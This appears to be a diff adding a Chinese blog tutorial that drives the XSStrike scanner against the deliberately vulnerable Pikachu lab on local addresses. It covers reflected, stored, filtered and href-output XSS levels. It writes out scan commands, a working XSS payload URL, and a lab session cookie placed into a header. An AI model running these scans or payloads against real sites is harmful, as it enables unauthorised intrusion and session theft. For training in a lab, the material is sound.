@@ -1,0 +1,74 @@
+<hr>
+<h2 id="title-XSStrike实战教程date-2024-05-20categories-Web安全-工具使用tags-XSS-XSStrike-渗透测试"><a href="#title-XSStrike实战教程date-2024-05-20categories-Web安全-工具使用tags-XSS-XSStrike-渗透测试" class="headerlink" title="title: XSStrike实战教程date: 2024-05-20categories:  - Web安全  - 工具使用tags:  - XSS  - XSStrike  - 渗透测试"></a>title: XSStrike实战教程<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - 工具使用<br>tags:<br>  - XSS<br>  - XSStrike<br>  - 渗透测试</h2><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="XSStrike的基本使用"><a href="#XSStrike的基本使用" class="headerlink" title="XSStrike的基本使用"></a>XSStrike的基本使用</h1><p>下面是他的常用命令</p>
+<ul>
+<li>-u url</li>
+<li>–skip 跳过确认提示</li>
+<li>–skip-dom 跳过dom型扫描</li>
+<li>–data post型时的数据</li>
+</ul>
+<p>这里我们使用pikachu平台进行测试</p>
+<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p><img src="/assets/image-20250520023352-uo3hi74.png" alt="image"></p>
+<p>这是最简单的，我们先手动submit一下看看url</p>
+<p><img src="/assets/image-20250520023402-255gf3e.png" alt="image"></p>
+<p>直接写payload</p>
+<pre><code class="language-bash">python xsstrike.py -u &quot;http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=k123&amp;submit=submit&quot; --skip --skip-dom
+</code></pre>
+<p>这就是根据刚刚的基本命令写的，最后两个参数就是跳过确认提示和跳过dom型扫描，因为已经说了是反射型了</p>
+<p><img src="/assets/image-20250520023415-vfrekc7.png" alt="image">​</p>
+<p>因为这个是最简单的xss所以有很多的payload，列出的payload都是成功的</p>
+<p>比如第一个(注意payload包括括号)</p>
+<pre><code class="language-bash">http://10.211.55.4/pikachu-master/vul/xss/xss_reflected_get.php?message=%3CdEtaIls/+/ontoggLE+=+[8].find(confirm)%3E&amp;submit=submit
+</code></pre>
+<p><img src="/assets/image-20250520023440-tiuzgl6.png" alt="image"></p>
+<p>点击详细信息就会弹窗（safari浏览器弹不了，只能用谷歌）</p>
+<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><hr>
+<p>这个是需要登陆的，所以需要拿cookie</p>
+<p><img src="/assets/image-20250520023454-xfhhd3j.png" alt="image"></p>
+<p>这里传的参是通过post传的，所以还需要拿post</p>
+<p>获取post可以抓包获取，也可以直接看请求</p>
+<p><img src="/assets/image-20250520023501-fcokexp.png" alt="image"></p>
+<p>点一下view source看完整的</p>
+<p><img src="/assets/image-20250520023508-ywgokzv.png" alt="image"></p>
+<p>这就是post请求了，然后再找cookie</p>
+<p><img src="/assets/image-20250520023515-lv1zzz7.png" alt="image"></p>
+<p>可以在控制台输入document.cookie来获取cookie</p>
+<p>现在有了post请求和cookie就可以使用软件了</p>
+<blockquote>
+<pre><code class="language-bash">python xsstrike.py -u &quot;http://10.211.55.4/pikachu-master/vul/xss/xsspost/xss_reflected_post.php&quot; --data &quot;message=1&amp;submit=submit&quot; --headers &quot;Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ik287bd9bniuabdun1psescmr3&quot;
+</code></pre>
+</blockquote>
+<p>要注意格式，需要自己添加Cookie:然后这后面又个空格</p>
+<p><img src="/assets/image-20250520023535-u7joe1g.png" alt="image"></p>
+<p>用第一个payload试一试</p>
+<p><img src="/assets/image-20250520023542-25jl455.png" alt="image"></p>
+<p>配合hackbar发送</p>
+<p><img src="/assets/image-20250520023550-3xuog8w.png" alt="image"><img src="/assets/image-20250520023553-0kxick2.png" alt="image"></p>
+<p>鼠标移动上去就弹窗</p>
+<hr>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/assets/image-20250520023610-8smbq12.png" alt="image"></p>
+<p>这也是post发送的</p>
+<pre><code class="language-jboss-cli">python xsstrike.py -u &quot;http://10.211.55.4/pikachu-master/vul/xss/xss_stored.php&quot; --data &quot;message=1&amp;submit=submit&quot; --skip-dom --skip
+</code></pre>
+<p><img src="/assets/image-20250520023623-pjrutwo.png" alt="image"></p>
+<p>因为这是存储的，所以它测试的时候会不断传进去，及时按ctrl+c停止</p>
+<p><img src="/assets/image-20250520023631-8diah4y.png" alt="image"><img src="/assets/image-20250520023634-zrbz4a5.png" alt="image"></p>
+<hr>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>这个用XSStrike做不出来，如果有人可以做出来欢迎补充</p>
+<hr>
+<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="/assets/image-20250520023650-yn41p64.png" alt="image"></p>
+<p>通过get传参并且有回显，直接跑</p>
+<pre><code class="language-vim">python xsstrike.py -u &quot;http://10.211.55.4/pikachu-master/vul/xss/xss_01.php?message=13&amp;submit=submit&quot; --skip
+</code></pre>
+<p><img src="/assets/image-20250520023703-qk66wlr.png" alt="image"></p>
+<p><img src="/assets/image-20250520023714-ujyvkd4.png" alt="image"><img src="/assets/image-20250520023717-tqnkd4v.png" alt="image"></p>
+<hr>
+<h2 id="XSS之HTML特殊字符"><a href="#XSS之HTML特殊字符" class="headerlink" title="XSS之HTML特殊字符"></a>XSS之HTML特殊字符</h2><p>这题用工具跑出来的payload用不了，会被转义</p>
+<p>还是手动好</p>
+<hr>
+<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/assets/image-20250520023740-4kqh3ql.png" alt="image"></p>
+<pre><code class="language-bash">python xsstrike.py -u &quot;http://10.211.55.4/pikachu-master/vul/xss/xss_03.php?message=123&amp;submit=submit&quot; --skip
+</code></pre>
+<p><img src="/assets/image-20250520023750-d85dkno.png" alt="image"></p>
+<p><img src="/assets/image-20250520023753-b9ptlcx.png" alt="image"></p>
+<hr>
+<h2 id="XSS之href输出-1"><a href="#XSS之href输出-1" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>这题也不能靠工具</p>
